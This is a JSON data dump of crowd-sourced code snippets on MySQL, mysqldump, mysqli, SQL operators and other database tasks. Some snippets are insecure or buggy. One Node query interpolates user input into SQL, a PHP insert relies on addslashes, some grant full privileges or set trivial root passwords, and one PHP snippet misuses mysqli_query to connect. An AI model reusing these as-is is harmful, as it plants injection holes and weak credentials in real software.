    "reg_date": "2021-10-12T09:57:52.000Z"
  },
  {
    "id": 2539,
    "keyword": null,
    "link": null,
    "title": " mysqldump: couldn't execute 'select column name, json extract(histogram, '$.\"number-of-buckets-specified\"') from information schema.column statistics",
    "description": "mysqldump --column-statistics=0 --host=<server> --user <user> --password <securepass> \n",
    "reg_date": "2021-10-12T09:57:52.000Z"
  },
  {
    "id": 2540,
    "keyword": null,
    "link": null,
    "title": " mysqldump: couldn",
    "description": "mysqldump --column-statistics=0 --host=<server> --user=<user> --password=<password> \nmysqldump --column-statistics=0 --host=<server> --user <user> --password <securepass> \nmysqldump -uroot -p omnichannel_store_india > omnichannel_store_india.sql\n",
    "reg_date": "2021-10-12T09:57:52.000Z"
  },
  {
    "id": 2541,
    "keyword": null,
    "link": null,
    "title": " mysqldump 1 table only",
    "description": "#note by specifying -p flag without a password it'll prompt you for pass  #dump specific files to a SQL file mysqldump -u userHERE -p --lock-tables=false database_name table1 table2 table3 > mydb_tables.sql   #if you want to import a file into the data use this mysql -u userHERE -p database_name < file.sql\nmysqldump -u <db_username> -h <db_host> -p db_name table_name > table_name.sql \nmysqldump db_name table_name > table_name.sql \nmysqldump db_name table_name --where=\"id > 1\"\n",
    "reg_date": "2021-10-12T09:57:53.000Z"
  },
  {
    "id": 2542,
    "keyword": null,
    "link": null,
    "title": " mysqldump cli command",
    "description": "mysqldump -u username -p dbname > filename.sql\n# Syntax mysqldump -u [username] -p [database-to-dump] > [database-to-receive]  # Pipe it! Exporting DB from external host mysqldump -u [username] -P [port] -h [host] [database-to-dump] | mysql -u root -h 127.0.0.1 [database-to-receive]  # Export specific tables by typing the name after the targeted DB mysqldump -u [username] -P [port] -h [host] [database-to-dump] [tabl1] [table2] [table3] | mysql -u root -h 127.0.0.1 [database-to-receive]\nPress CTRL+C to copy shell> mysqldump --databases db1 db2 db3 > dump.sql\n",
    "reg_date": "2021-10-12T09:57:53.000Z"
  },
  {
    "id": 2543,
    "keyword": null,
    "link": null,
    "title": " mysqldump don't drop table",
    "description": "mysqldump --skip-add-drop-table\n",
    "reg_date": "2021-10-12T09:57:53.000Z"
  },
  {
    "id": 2544,
    "keyword": null,
    "link": null,
    "title": " mysqldump password",
    "description": "add this to .my.cnf file user can be omitted  [mysqldump] user=mysqluser password=secret  The -p option must be excluded from the command in order to use the password in the config file. Correct: mysqldump &ndash;u my_username my_db > my_db.sql Wrong: mysqldump &ndash;u my_username -p my_db > my_db.sql\n[mysqldump] user=mysqluser password=secret \n",
    "reg_date": "2021-10-12T09:57:53.000Z"
  },
  {
    "id": 2545,
    "keyword": null,
    "link": null,
    "title": " mysqldump password in file",
    "description": "add this to .my.cnf file user can be omitted  [mysqldump] user=mysqluser password=secret  The -p option must be excluded from the command in order to use the password in the config file. Correct: mysqldump &ndash;u my_username my_db > my_db.sql Wrong: mysqldump &ndash;u my_username -p my_db > my_db.sql\n[mysqldump] user=mysqluser password=secret \n",
    "reg_date": "2021-10-12T09:57:53.000Z"
  },
  {
    "id": 2546,
    "keyword": null,
    "link": null,
    "title": " mysqldump restore",
    "description": "mysql -u [user] -p [database_name] < [filename].sql\n# Syntax mysqldump -u [username] -p [database-to-dump] > [database-to-receive]  # Pipe it! Exporting DB from external host mysqldump -u [username] -P [port] -h [host] [database-to-dump] | mysql -u root -h 127.0.0.1 [database-to-receive]  # Export specific tables by typing the name after the targeted DB mysqldump -u [username] -P [port] -h [host] [database-to-dump] [tabl1] [table2] [table3] | mysql -u root -h 127.0.0.1 [database-to-receive]\nmysqldump -u [username] -p [database-to-dump] > filename(e.g. dump.sql)  # or  sudo mysql database_name > filename \nmysqldump -u [username] -p [database-to-dump] > [database-to-receive].sql\n",
    "reg_date": "2021-10-12T09:57:53.000Z"
  },
  {
    "id": 2547,
    "keyword": null,
    "link": null,
    "title": " mysqldump structure only",
    "description": "# Syntax mysqldump -u [username] -p [database-to-dump] > [database-to-receive]  # Pipe it! Exporting DB from external host mysqldump -u [username] -P [port] -h [host] [database-to-dump] | mysql -u root -h 127.0.0.1 [database-to-receive]  # Export specific tables by typing the name after the targeted DB mysqldump -u [username] -P [port] -h [host] [database-to-dump] [tabl1] [table2] [table3] | mysql -u root -h 127.0.0.1 [database-to-receive]\nmysqldump --no-data -u someuser -p mydatabase \n",
    "reg_date": "2021-10-12T09:57:53.000Z"
  },
  {
    "id": 2548,
    "keyword": null,
    "link": null,
    "title": " mysqli::query(): (HY000/1034): Index for table 'db' is corrupt; try to repair it",
    "description": "repair table DATABASENAME.TABLENAME use_frm;   I'm sure you know that you should change capitals with your storage  preferences and backup before runing this command, don't you? :)  Source: David Malekahmadi  \n",
    "reg_date": "2021-10-12T09:57:53.000Z"
  },
  {
    "id": 2549,
    "keyword": null,
    "link": null,
    "title": " mysqli connect",
    "description": "<?php $enlace = mysqli_connect(\"127.0.0.1\", \"mi_usuario\", \"mi_contrase&ntilde;a\", \"mi_bd\");  if (!$enlace) {     echo \"Error: No se pudo conectar a MySQL.\" . PHP_EOL;     echo \"errno de depuraci&oacute;n: \" . mysqli_connect_errno() . PHP_EOL;     echo \"error de depuraci&oacute;n: \" . mysqli_connect_error() . PHP_EOL;     exit; }  echo \"&Eacute;xito: Se realiz&oacute; una conexi&oacute;n apropiada a MySQL! La base de datos mi_bd es genial.\" . PHP_EOL; echo \"Informaci&oacute;n del host: \" . mysqli_get_host_info($enlace) . PHP_EOL;  mysqli_close($enlace); ?>\n $mysqli = new mysqli(host, username, password, dbname, port, socket)\nmysqli_connect(host, username, password, dbname, port, socket)\n <?php $mysqli = new mysqli(\"localhost\",\"my_user\",\"my_password\",\"my_db\");  // Check connection if ($mysqli -> connect_errno) {    echo \"Failed to connect to MySQL: \" . $mysqli -> connect_error;      exit();    } ?>\n<?php; $db_handle = mysqli_connect($db_server_name, $db_user_name, $db_password); ?>\n// mysqli_connect is an alias of mysqli::__construct() $mysqli = new mysqli(\"host\", \"user\", \"password\", \"database\", 'port', 'socket');\n",
    "reg_date": "2021-10-12T09:57:53.000Z"
  },
  {
    "id": 2550,
    "keyword": null,
    "link": null,
    "title": " mysqli connect using prepare statement",
    "description": "$stmt = $mysqli->prepare(\"DELETE FROM myTable WHERE id = ?\"); $stmt->bind_param(\"i\", $_SESSION['id']); $stmt->execute(); $stmt->close(); Copy\n$stmt = $mysqli->prepare(\"INSERT INTO myTable (name, age) VALUES (?, ?)\"); $stmt->bind_param(\"si\", $_POST['name'], $_POST['age']); $stmt->execute(); $stmt->close(); Copy\n$stmt = $mysqli->prepare(\"UPDATE myTable SET name = ? WHERE id = ?\"); $stmt->bind_param(\"si\", $_POST['name'], $_SESSION['id']); $stmt->execute(); $stmt->close(); Copy\n",
    "reg_date": "2021-10-12T09:57:53.000Z"
  },
  {
    "id": 2551,
    "keyword": null,
    "link": null,
    "title": " mysqli fetch assoc",
    "description": "<?php \t/* Connect to your database */ \t$con = mysqli_query(\"hostname\", \"username\", \"pwd\", \"database\");     /* Select Columns from table*/     $sql = \"SELECT * FROM `TABLE`\";     /* Query your SQL code to SQLDatabase */     $result = mysqli_query($con, $sql);     /* Find rows in table*/     $check = mysqli_num_rows($result);     if($check > 0){     while($data= mysqli_fetch_assoc($result)){     /* Print all of your data*/     echo $data[\"ColName\"];     }     } ?>\n<?php $mysqli = new mysqli(\"localhost\", \"my_user\", \"my_password\", \"world\");  /* check connection */ if ($mysqli->connect_errno) {     printf(\"Connect failed: %s\\n\", $mysqli->connect_error);     exit(); }  $query = \"SELECT Name, CountryCode FROM City ORDER by ID DESC LIMIT 50,5\";  if ($result = $mysqli->query($query)) {      /* fetch associative array */     while ($row = $result->fetch_assoc()) {         printf (\"%s (%s)\\n\", $row[\"Name\"], $row[\"CountryCode\"]);     }      /* free result set */     $result->free(); }  /* close connection */ $mysqli->close(); ?>\n",
    "reg_date": "2021-10-12T09:57:53.000Z"
  },
  {
    "id": 2552,
    "keyword": null,
    "link": null,
    "title": " mysqli last row",
    "description": "SELECT id FROM table ORDER BY id DESC LIMIT 1;\n",
    "reg_date": "2021-10-12T09:57:54.000Z"
  },
  {
    "id": 2553,
    "keyword": null,
    "link": null,
    "title": " mysqli real connect(): (HY000/1698): Access denied for user 'root'@'localhost'",
    "description": "$ sudo mysql -u root # I had to use \"sudo\" since is new installation  mysql> USE mysql; mysql> UPDATE user SET plugin='mysql_native_password' WHERE User='root'; mysql> FLUSH PRIVILEGES; mysql> exit;  $ service mysql restart\n$ sudo mysql -u root -p Now you can add a new MySQL user with the username of your choice.  mysql> CREATE USER 'newuser'@'localhost' IDENTIFIED BY 'password'; And finally grant superuser privileges to the user you just created.  mysql> GRANT ALL PRIVILEGES ON * . * TO 'newuser'@'localhost';  after that go and edit .env DB_USERNAME=newuser DB_PASSWORD=password \nALTER USER 'root'@'localhost' IDENTIFIED BY 'mysql';\nSELECT user,authentication_string,plugin,host FROM mysql.user; ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'Current-Root-Password'; FLUSH PRIVILEGES;\n$cfg['Servers'][$i]['port'] = '3307';\n",
    "reg_date": "2021-10-12T09:57:54.000Z"
  },
  {
    "id": 2554,
    "keyword": null,
    "link": null,
    "title": " mysqli real connect(): Server sent charset (255) unknown to the client. Please, report to the developers",
    "description": "    Create a file called my.cnf in your /etc/ folder.      Now add the following text to /etc/my.cnf:      [client]     default-character-set=utf8      [mysql]     default-character-set=utf8      [mysqld]     collation-server = utf8_unicode_ci     character-set-server = utf8     default_authentication_plugin = mysql_native_password  Finally, restart mysql and all should be well! If you still have an issue, try upgrading PHP to a later version. \nEditaremos el archivo de configuraci&oacute;n my.cnf El cual se debe encontrar en C:\\ProgramData\\MySQL\\MySQL Server 8.0 Agregamos y/o modificamos las siguientes lineas:  [client] default-character-set=utf8  [mysql] default-character-set=utf8  [mysqld] collation-server = utf8_unicode_ci  character-set-server = utf8   Una vez hecho esto, reinicien su servicio de Mysql\n",
    "reg_date": "2021-10-12T09:57:54.000Z"
  },
  {
    "id": 2555,
    "keyword": null,
    "link": null,
    "title": " mysqli real connect(): The server requested authentication method unknown to the client [caching sha2 password]",
    "description": "ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'root';\nALTER USER 'mysqlUsername'@'localhost' IDENTIFIED WITH mysql_native_password BY 'mysqlUsernamePassword'; \n",
    "reg_date": "2021-10-12T09:57:54.000Z"
  },
  {
    "id": 2556,
    "keyword": null,
    "link": null,
    "title": " mysqlimport csv",
    "description": "C:\\mysql\\bin>mysqlimport --ignore-lines=1 --fields-terminated-by=, --verbose --local -u root query C:/mysql/bin/mysql-files/address.csv  Connecting to localhost  Selecting database query  Loading data from LOCAL file: C:/mysql/bin/mysql-files/address.csv into address  query.address: Records: 3 Deleted: 0 Skipped: 0 Warnings: 0 Disconnecting from localhost  mysql> Select * from Address; +---------+----------+-------------+ | Name    | LastName | Address     | +---------+----------+-------------+ | Mohan   | Sharma   | Sundernagar | | Saurabh | Arora    | Chandigarh  | | Rajesh  | Singh    | Lucknow     | +---------+----------+-------------+ 3 rows in set (0.00 sec)\n",
    "reg_date": "2021-10-12T09:57:54.000Z"
  },
  {
    "id": 2557,
    "keyword": null,
    "link": null,
    "title": " myswql show full processlist",
    "description": "select * from INFORMATION_SCHEMA.PROCESSLIST where db = 'your_database_name_here';\n",
    "reg_date": "2021-10-12T09:57:54.000Z"
  },
  {
    "id": 2558,
    "keyword": null,
    "link": null,
    "title": " name of today sql",
    "description": "SELECT GETDATE() 'Today', DATENAME(weekday,GETDATE()) 'Day Name' SELECT GetDate() 'Today', DATENAME(dw,GETDATE()) 'Day Name' \n",
    "reg_date": "2021-10-12T09:57:54.000Z"
  },
  {
    "id": 2559,
    "keyword": null,
    "link": null,
    "title": " natural join sql",
    "description": "SELECT * FROM table1 NATURAL JOIN table2;\nSELECT id,aval1,cval1 FROM table111 NATURAL JOIN table113;  \nSELECT * FROM TabelleA NATURAL JOIN TabelleB \nsalesman_id\tcity\t\tcustomer_id\tord_no\tpurch_amt\tord_date\tcust_name\tgrade\tname\t\tcommission 5005\t\tLondon\t\t3001\t\t70009\t270.65\t\t2012-09-10\tBrad Guzan\t\tPit Alex\t0.11 5001\t\tNew York\t3002\t\t70002\t65.26\t\t2012-10-05\tNick Rimando\t100\tJames Hoog\t0.15 5001\t\tNew York\t3007\t\t70005\t2400.60\t\t2012-07-27\tBrad Davis\t200\tJames Hoog\t0.15 5001\t\tNew York\t3002\t\t70008\t5760.00\t\t2012-09-10\tNick Rimando\t100\tJames Hoog\t0.15 5006\t\tParis\t\t3004\t\t70010\t1983.43\t\t2012-10-10\tFabian Johnson\t300\tMc Lyon\t\t0.14 5001\t\tNew York\t3002\t\t70013\t3045.60\t\t2012-04-25\tNick Rimando\t100\tJames Hoog\t0.15 \n",
    "reg_date": "2021-10-12T09:57:54.000Z"
  },
  {
    "id": 2560,
    "keyword": null,
    "link": null,
    "title": " nd pdo mysql working",
    "description": "MySQL_ND and MySQL PHP extensions are the different sets of drivers. They are  provided by the different teams of developers (MySQL and PHP, respectively).  The most important is the fact that they are mutually exclusive - you can not  select them both simultaneously or mix them in any way. Otherwise, the php code  will throw errors about the connection to the MySQL database.  Since PHP 5.4, mysqlnd is used as the default MySQL driver for all PHP MySQL  extensions. But for PHP 5.3 and older PHP versions libmysqlclient is used as a  connector from PHP to MySQL.  For PHP Selector we need to support both methods, that is why we added nd_*  prefix for PHP MySQL extensions compatible with mysqlnd.  So, as a result: - libmysqlclient works with  mysql, mysqli, pdo_mysql extensions (PHP 4.4 - PHP 5.3); - mysqlnd works with nd_mysql, nd_mysqli, nd_pdo_mysql extensions (PHP 5.4 - PHP 7.1+).  So you have to choose only one of the following sets:  mysqlnd && nd_mysql && nd_mysqli && nd_pdo_mysql  ###################### OR ########################  mysql && mysqli && pdo_mysql\n",
    "reg_date": "2021-10-12T09:57:54.000Z"
  },
  {
    "id": 2561,
    "keyword": null,
    "link": null,
    "title": " neo4j command to run script file",
    "description": "$neo4j-home> cat examples.cypher | bin/cypher-shell -u neo4j -p <password> --format plain\n$neo4j-home> type examples.cypher | bin/cypher-shell.bat -u neo4j -p <password> --format plain\n",
    "reg_date": "2021-10-12T09:57:55.000Z"
  },
  {
    "id": 2562,
    "keyword": null,
    "link": null,
    "title": " neo4j display all nodes and relationships",
    "description": "Match (n)-[r]->(m) Return n,r,m\n",
    "reg_date": "2021-10-12T09:57:55.000Z"
  },
  {
    "id": 2563,
    "keyword": null,
    "link": null,
    "title": " nested case statement in mysql",
    "description": "SELECT CASE col1 \tWHEN 'agree' THEN 'Ok' \tWHEN 'disagree' THEN 'Ko'     ELSE         CASE              WHEN col2 >= 1 THEN 'Ko'             ELSE 'Maybe'         END END AS my_result FROM table_name;\n",
    "reg_date": "2021-10-12T09:57:55.000Z"
  },
  {
    "id": 2564,
    "keyword": null,
    "link": null,
    "title": " nested case statement in sql",
    "description": "SELECT CASE col1 \tWHEN 'agree' THEN 'Ok' \tWHEN 'disagree' THEN 'Ko'     ELSE         CASE              WHEN col2 >= 1 THEN 'Ko'             ELSE 'Maybe'         END END AS my_result FROM table_name;\n",
    "reg_date": "2021-10-12T09:57:55.000Z"
  },
  {
    "id": 2565,
    "keyword": null,
    "link": null,
    "title": " nested case statement in sql oracle",
    "description": "SELECT CASE col1 \tWHEN 'agree' THEN 'Ok' \tWHEN 'disagree' THEN 'Ko'     ELSE         CASE              WHEN col2 >= 1 THEN 'Ko'             ELSE 'Maybe'         END END AS my_result FROM table_name;\n",
    "reg_date": "2021-10-12T09:57:55.000Z"
  },
  {
    "id": 2566,
    "keyword": null,
    "link": null,
    "title": " nested if in mysql",
    "description": "SELECT CASE col1 \tWHEN 'agree' THEN 'Ok'     ELSE         CASE              WHEN col2 >= 1 THEN 'Ko'             ELSE 'Maybe'         END END AS my_result FROM table_name;\n",
    "reg_date": "2021-10-12T09:57:55.000Z"
  },
  {
    "id": 2567,
    "keyword": null,
    "link": null,
    "title": " netstat -tln mysql",
    "description": "lsof -n -P -i TCP -s TCP:LISTEN\n",
    "reg_date": "2021-10-12T09:57:55.000Z"
  },
  {
    "id": 2568,
    "keyword": null,
    "link": null,
    "title": " no data found oracle",
    "description": "BEGIN  select... into...  EXCEPTION WHEN NO_DATA_FOUND THEN do_something END;\n",
    "reg_date": "2021-10-12T09:57:55.000Z"
  },
  {
    "id": 2569,
    "keyword": null,
    "link": null,
    "title": " no database selected mysql stack overflow",
    "description": "USE database_name; \n",
    "reg_date": "2021-10-12T09:57:55.000Z"
  },
  {
    "id": 2570,
    "keyword": null,
    "link": null,
    "title": " no sql",
    "description": "TLDR: NoSQL databases (aka \"not only SQL\") are non tabular, and store data differently than relational tables. NoSQL databases come in a variety of types based on their data model. The main types are document, key-value, wide-column, and graph. They provide flexible schemas and scale easily with large amounts of data and high user loads.  Refer link for more : https://www.mongodb.com/nosql-explained\n",
    "reg_date": "2021-10-12T09:57:55.000Z"
  },
  {
    "id": 2571,
    "keyword": null,
    "link": null,
    "title": " node-pre-gyp ERR! Tried to download(403): https://mapbox-node-binary.s3.amazonaws.com/sqlite3/v3.1.13/node-v72-win32-x64.tar.gz",
    "description": "Solution is to switch to node version 9.11.1  You can install nvm to help you with dynamically switch between node versions.  Thank me later : )\n",
    "reg_date": "2021-10-12T09:57:55.000Z"
  },
  {
    "id": 2572,
    "keyword": null,
    "link": null,
    "title": " node and mysql like",
    "description": "   return db.query(`SELECT * FROM user WHERE fullname LIKE N'%${data.fullname}%' ORDER BY create_time DESC LIMIT ?, ? `, [data.start,data.limit], callback);\n",
    "reg_date": "2021-10-12T09:57:56.000Z"
  },
  {
    "id": 2573,
    "keyword": null,
    "link": null,
    "title": " nosql vs sql",
    "description": "SQL\t\t\t\t\t\t|    NoSQL   relational\t\t\t| non-relational   \t\t\t\t\t\t| use structured query\t| NoSQL databases have  language and have a\t\t| dynamic schemas for  predefined schema.\t\t| unstructured data. \t\t\t\t\t\t| are vertically scalable | are horizontally scalable. are table based\t\t\t| are document, key-value, \t\t\t\t\t\t| graph or wide-column stores.                         | are better for multi-row| are better for unstructured  transactions\t\t\t| data like documents or JSON.\nA SQL Database follows a table like structure which can have an  unlimited number of rows and every data present inside the database  is properly structured with Predefined Schemas, it is basically used  to manipulate Relational Databases Management Systems.  A NoSQL Database is a Distributed Database where the data is very  unstructured with Dynamic Schema. Unlike SQL it cannot have unlimited  rows but it follows a Standard Schema Definition and can store all  sorts of data models with large distributed data in the form of  key-value pairs, graph databases, documents or wide-column stores.\n/* KEY DIFFERENCE SQL pronounced as \"S-Q-L\" or as \"See-Quel\" is primarily called RDBMS or Relational Databases whereas NoSQL is a Non-relational or Distributed Database. SQL databases are table based databases whereas NoSQL databases can be document based, key-value pairs, graph databases. SQL databases are vertically scalable while NoSQL databases are horizontally scalable. SQL databases have a predefined schema whereas NoSQL databases use dynamic schema for unstructured data. SQL requires specialized DB hardware for better performance while NoSQL uses commodity hardware.*/\n----------------- key differences | ----------------- SQL databases are usually RDBMS or DBMS (Relational DataBase Management Systems) and are table based, NoSQL uses unstructured data (like graphs)  ----------------- Examples        | ----------------- SQL Databases: MySQL SQLite Oracle DB  NoSQL: MongoDB DynamoDB\nNoSQL systems are also sometimes called \"Not only SQL\" to emphasize that they may support SQL-like query languages or sit alongside SQL databases in polyglot-persistent architectures.\n",
    "reg_date": "2021-10-12T09:57:56.000Z"
  },
  {
    "id": 2574,
    "keyword": null,
    "link": null,
    "title": " not a group by expression case statement",
    "description": "SELECT a, b, sum(c) FROM my_table GROUP BY a;\t\t-- Error SELECT a, b, sum(c) FROM my_table GROUP BY a, b;\t-- OK, all expressions there -- CASE WHEN statement, for example: SELECT a, CASE WHEN b=1 THEN 'Ok' ELSE 'Ko' END AS r, sum(c)  FROM my_table GROUP BY a, CASE WHEN b=1 THEN 'Ok' ELSE 'Ko' END;\t\t-- No alias name (r)\n",
    "reg_date": "2021-10-12T09:57:56.000Z"
  },
  {
    "id": 2575,
    "keyword": null,
    "link": null,
    "title": " not equal in sql",
    "description": "Equal to\t\t\t\t\t\t=\t\t= A1 = B1\tThe formula returns TRUE if a value in cell A1 is equal to the values in cell B1; FALSE otherwise. Not equal to\t\t\t\t    <>\t\t= A1 <> B1\tThe formula returns TRUE if a value in cell A1 is not equal to the value in cell B1; FALSE otherwise. Greater than\t\t\t\t\t>\t\t= A1 > B1\tThe formula returns TRUE if a value in cell A1 is greater than a value in cell B1; otherwise it returns FALSE. Less than\t\t\t\t\t\t<\t\t= A1 < B1\tThe formula returns TRUE if a value in cell A1 is less than in cell B1; FALSE otherwise. Greater than or equal to\t   >=\t\t= A1 >= B1\tThe formula returns TRUE if a value in cell A1 is greater than or equal to the values in cell B1; FALSE otherwise. Less than or equal to\t\t   <=\t\t= A1 <= B1\tThe formula returns TRUE if a value in cell A1 is less than or equal to the values in cell B1; FALSE otherwise.\n<>\tNot equal. Note: In some versions of SQL this operator may be written as !=  Example sql query:  1) Selecting groceries where price is not 20 SELECT * FROM Grocery WHERE Price <> 20;\n<> Not Equal  != Not Equal\nrow <> value\n",
    "reg_date": "2021-10-12T09:57:56.000Z"
  },
  {
    "id": 2576,
    "keyword": null,
    "link": null,
    "title": " not equal operator sql",
    "description": "<>\tNot equal. Note: In some versions of SQL this operator may be written as !=  Example sql query:  1) Selecting groceries where price is not 20 SELECT * FROM Grocery WHERE Price <> 20;\n<> Not Equal  != Not Equal\n",
    "reg_date": "2021-10-12T09:57:56.000Z"
  },
  {
    "id": 2577,
    "keyword": null,
    "link": null,
    "title": " not exists mysql",
    "description": "SELECT DISTINCT store_type FROM stores WHERE NOT EXISTS (SELECT * FROM cities_stores                     WHERE cities_stores.store_type = stores.store_type);\n",
    "reg_date": "2021-10-12T09:57:56.000Z"
  },
  {
    "id": 2578,
    "keyword": null,
    "link": null,
    "title": " not keyword in sql",
    "description": "SELECT * FROM Customers WHERE Country NOT IN ('Germany', 'France', 'UK');\n(NOT) operator excluding given For example: Select last_name, job_id From Employees Where \"Not\" job_id = 'ABC'; \nSQL NOT IN operator is used to filter the result if the values that are mentioned as part of the IN operator is not satisfied. Let&rsquo;s discuss in detail about SQL NOT IN operator.  Syntax: SELECT Column(s) FROM table_name WHERE Column NOT IN (value1, value2... valueN);\nUsed to join separate conditions within a WHERE clause. Example: Returns events located in London, United Kingdom SELECT * FROM events WHERE host_country='United Kingdom' AND host_ city='London';\n",
    "reg_date": "2021-10-12T09:57:56.000Z"
  },
  {
    "id": 2579,
    "keyword": null,
    "link": null,
    "title": " not operator in sql",
    "description": "SELECT * FROM Customers WHERE Country NOT IN ('Germany', 'France', 'UK');\n(NOT) operator excluding given For example: Select last_name, job_id From Employees Where \"Not\" job_id = 'ABC'; \nReturns true if a record DOESN&rsquo;T meet the condition. Example: Returns true if the user&rsquo;s first_name doesn&rsquo;t end with &lsquo;son&rsquo;. SELECT * FROM users WHERE first_name NOT LIKE '%son';\nSQL NOT IN operator is used to filter the result if the values that are mentioned as part of the IN operator is not satisfied. Let&rsquo;s discuss in detail about SQL NOT IN operator.  Syntax: SELECT Column(s) FROM table_name WHERE Column NOT IN (value1, value2... valueN);\n(NOT) operator excluding given For example: Select last_name, job_id From Employees Where \"Not\" job_id = 'ABC';\n (NOT) operator excluding given For example: Select last_name, job_id From Employees Where \"Not\" job_id = 'ABC'; \n",
    "reg_date": "2021-10-12T09:57:56.000Z"
  },
  {
    "id": 2580,
    "keyword": null,
    "link": null,
    "title": " npm ERR! code ELIFECYCLE npm ERR! errno 1 npm ERR! sqlite3@4.2.0 install: `node-pre-gyp install --fallback-to-build` npm ERR! Exit status 1 npm ERR! npm ERR! Failed at the sqlite3@4.2.0 install script.",
    "description": "npm uninstall sqlite3 npm cache clean npm install sqlite3 \n",
    "reg_date": "2021-10-12T09:57:56.000Z"
  },
  {
    "id": 2581,
    "keyword": null,
    "link": null,
    "title": " npm install mysql2",
    "description": "npm install --save mysql2\n",
    "reg_date": "2021-10-12T09:57:57.000Z"
  },
  {
    "id": 2582,
    "keyword": null,
    "link": null,
    "title": " nth highest salary in sql",
    "description": "SELECT TOP 1 salary FROM ( SELECT DISTINCT TOP N salary FROM #Employee ORDER BY salary DESC ) AS temp ORDER BY salary\nHere is the solution for nth highest salary from employees table   SELECT FIRST_NAME , SALARY FROM  (SELECT FIRST_NAME, SALARY, DENSE_RANK() OVER (ORDER BY SALARY DESC) AS SALARY_RANK FROM EMPLOYEES) WHERE SALARY_RANK = n; \nSELECT MAX(SALARY) 'SECOND_MAX' FROM EMPLOYEES WHERE SALARY <> (SELECT MAX(SALARY) FROM EMPLOYEES);   OR  Here is the solution for nth highest salary from employees table   SELECT FIRST_NAME , SALARY FROM  (SELECT FIRST_NAME, SALARY, DENSE_RANK() OVER (ORDER BY SALARY DESC) AS SALARY_RANK FROM EMPLOYEES) WHERE SALARY_RANK = n; \nHere is the solution for 3rd highest salary from employees table   SELECT FIRST_NAME , SALARY FROM  (SELECT FIRST_NAME, SALARY, DENSE_RANK() OVER (ORDER BY SALARY DESC) AS SALARY_RANK FROM EMPLOYEES) WHERE SALARY_RANK = 3; \nSELECT first-name FROM employees WHERE salary = (SELECT MAX(salary) FROM employees);\nSELECT MIN(EmpSalary) from (  \tSELECT EmpSalary from Employee ORDER BY EmpSalary DESC LIMIT 3  );\n",
    "reg_date": "2021-10-12T09:57:57.000Z"
  },
  {
    "id": 2583,
    "keyword": null,
    "link": null,
    "title": " null column as zero in mysql",
    "description": "COALESCE(null_column, 0)\n",
    "reg_date": "2021-10-12T09:57:57.000Z"
  },
  {
    "id": 2584,
    "keyword": null,
    "link": null,
    "title": " null column to 0  in mysql",
    "description": "UPDATE [table] SET [column]=0 WHERE [column] IS NULL; \nCOALESCE(null_column, 0)\n",
    "reg_date": "2021-10-12T09:57:57.000Z"
  },
  {
    "id": 2585,
    "keyword": null,
    "link": null,
    "title": " nvl in sql",
    "description": "(NVL) replaces NULL values with same type default value provided. For Example =  Select NVL(commission_percentage, 0) From Employees;\n",
    "reg_date": "2021-10-12T09:57:57.000Z"
  },
  {
    "id": 2586,
    "keyword": null,
    "link": null,
    "title": " nvl keyword in sql",
    "description": "(NVL) replaces NULL values with same type default value provided. For Example =  Select NVL(commission_percentage, 0) From Employees;\n",
    "reg_date": "2021-10-12T09:57:57.000Z"
  },
  {
    "id": 2587,
    "keyword": null,
    "link": null,
    "title": " nvl operator in sql",
    "description": "(NVL) replaces NULL values with same type default value provided. For Example =  Select NVL(commission_percentage, 0) From Employees;\n",
    "reg_date": "2021-10-12T09:57:57.000Z"
  },
  {
    "id": 2588,
    "keyword": null,
    "link": null,
    "title": " nvl postgres",
    "description": "                                     COALESCE (argument_1, argument_2, &hellip;);Code language: SQL (Structured Query Language) (sql)\n",
    "reg_date": "2021-10-12T09:57:57.000Z"
  },
  {
    "id": 2589,
    "keyword": null,
    "link": null,
    "title": " object dependencies in oracle",
    "description": "-- Dependencies on a view, table, ... SELECT *   FROM ALL_DEPENDENCIES\t\t\t-- or DBA_DEPENDENCIES or USER_DEPENDENCIES  WHERE TYPE = 'VIEW'\t\t\t-- or 'PROCEDURE', 'SYNONYM'...    AND REFERENCED_OWNER = 'OBJECT_OWNER'    AND REFERENCED_NAME = 'OBJECT_NAME';\n",
    "reg_date": "2021-10-12T09:57:57.000Z"
  },
  {
    "id": 2590,
    "keyword": null,
    "link": null,
    "title": " offset in postgresql example",
    "description": "Syntax,    SELECT select_list      FROM table_expression      [ ORDER BY ... ]      [ LIMIT { number | ALL } ] [ OFFSET number ]\n",
    "reg_date": "2021-10-12T09:57:57.000Z"
  },
  {
    "id": 2591,
    "keyword": null,
    "link": null,
    "title": " on update current timestamp jpa",
    "description": "@Temporal(TemporalType.TIMESTAMP) @Column(name = \"edit_timestamp\",          updatable = false         columnDefinition=\"TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP\") private Date editTimestamp;\n",
    "reg_date": "2021-10-12T09:57:57.000Z"
  },
  {
    "id": 2592,
    "keyword": null,
    "link": null,
    "title": " one insert many values postgresql",
    "description": "                                     INSERT INTO table_name (column_list) VALUES     (value_list_1),     (value_list_2),     ...     (value_list_n);\nINSERT INTO User (name, surname, \"roomId\") // roomId is with quetes(\"\") because it is case sensitive in this example   VALUES      ('Joe', 'Travolta', 1),     ('Jim', 'Carrey', 2),     ('Shakira', 'whenever', 3); // remember about semicolon(;) at the end\n",
    "reg_date": "2021-10-12T09:57:58.000Z"
  },
  {
    "id": 2593,
    "keyword": null,
    "link": null,
    "title": " one time insert and other time update",
    "description": "$sql = \"INSERT INTO \" .PHOTOS_TABLE. \"         (             photo_name,             photo_date,             photo_proper,             photo_size,             album_id         )         VALUES         (             '\" .addslashes($photo_name). \"',             \" .time(). \",             '\" .addslashes($key_name). \"',             \" .intval($size). \",             \" .$album. \"         )\";               $update_query=\"UPDATE albums set count=count+'1' where condition\"; // total will be updated to total+number of new puppies added.  mysql_query($update_query); \n",
    "reg_date": "2021-10-12T09:57:58.000Z"
  },
  {
    "id": 2594,
    "keyword": null,
    "link": null,
    "title": " only join in sql",
    "description": "They are functionally equivalent, but INNER JOIN can be  a bit clearer to read, especially if the query has  other join types (i.e. LEFT or RIGHT or CROSS)  included in it.\n",
    "reg_date": "2021-10-12T09:57:58.000Z"
  },
  {
    "id": 2595,
    "keyword": null,
    "link": null,
    "title": " open mysql in ubuntu terminal",
    "description": "mysql -u root -p \n",
    "reg_date": "2021-10-12T09:57:58.000Z"
  },
  {
    "id": 2596,
    "keyword": null,
    "link": null,
    "title": " open transactions sqlskills",
